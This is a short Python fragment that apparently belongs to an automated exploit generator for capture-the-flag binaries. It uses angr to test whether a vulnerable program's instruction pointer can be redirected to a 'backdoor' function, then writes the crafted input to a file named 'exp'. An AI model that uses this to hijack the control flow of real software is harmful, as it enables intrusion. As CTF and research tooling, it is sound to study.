import angr
from pwncli import *
log = logging.getLogger(__name__)



def exploit_dynamic(exploitable_state:angr.SimState,backdoor):
    if exploitable_state.satisfiable(extra_constraints=([exploitable_state.regs.pc == backdoor[0]['fcn_addr']])):
        exploitable_state.add_constraints(exploitable_state.regs.pc == backdoor[0]['fcn_addr'])
        log.info("[+] RIP can point to backdoor")
        print(exploitable_state.posix.dumps(0))
        print(exploitable_state.posix.dumps(1))
        with open("exp", 'wb') as f:
            f.write(exploitable_state.posix.dumps(0))
